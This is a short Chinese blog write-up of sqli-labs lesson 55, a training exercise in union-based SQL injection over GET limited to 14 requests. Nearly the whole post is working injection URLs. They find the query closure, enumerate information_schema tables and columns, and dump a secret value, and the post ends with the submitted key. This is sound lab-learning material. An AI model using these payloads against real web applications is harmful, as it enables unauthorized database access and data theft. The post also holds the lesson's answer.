---
title: sqli-labs lession-55 GET-Union-变化2-仅允许14次请求
date: 2018-11-28 16:38:44
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-55 GET-Union-变化2-仅允许14次请求

---

## 手注

难点还是快速找到闭合点

`http://10.60.17.35:8082/Less-55/?id=1)and+1=1%23`

`http://10.60.17.35:8082/Less-55/?id=1)and+1=2%23`

`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(database()),user()%23`

![001](/img/sql/Lesson-55/001.png)

`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`

![002](/img/sql/Lesson-55/002.png)

`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)++union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='5uq6lajw6o'),user()%23`

![003](/img/sql/Lesson-55/003.png)

`http://10.60.17.35:8082/Less-55/index.php?id=id=-1)+union+select+1,(select+GROUP_CONCAT(secret_Q3R0)from challenges.5uq6lajw6o),user()%23`

![004](/img/sql/Lesson-55/004.png)

提交`mRYe1KdluPEiZrDTZQtW1J7o`成功。

![005](/img/sql/Lesson-55/005.png)



